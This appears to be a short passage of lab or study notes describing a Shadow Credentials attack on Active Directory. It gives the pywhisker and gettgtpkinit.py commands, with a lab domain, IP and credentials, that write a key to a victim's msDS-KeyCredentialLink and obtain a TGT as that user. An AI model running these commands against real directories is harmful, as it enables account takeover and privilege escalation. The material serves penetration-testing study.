![[Pasted image 20250924165241.png]]

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system.

```sh
pywhisker --dc-ip 10.129.200.45 -d kyakei.com -u wwhite -p 'tongue_1' --target jpinkman --action add

python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.200.45 kyakei.com/jpinkman jpinkman.ccache
```

This command generates an `X.509 certificate` and writes the public key to the victim user's `msDS-KeyCredentialLink` attribute. After running `pywhisker` `PKX` file is created, and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim.

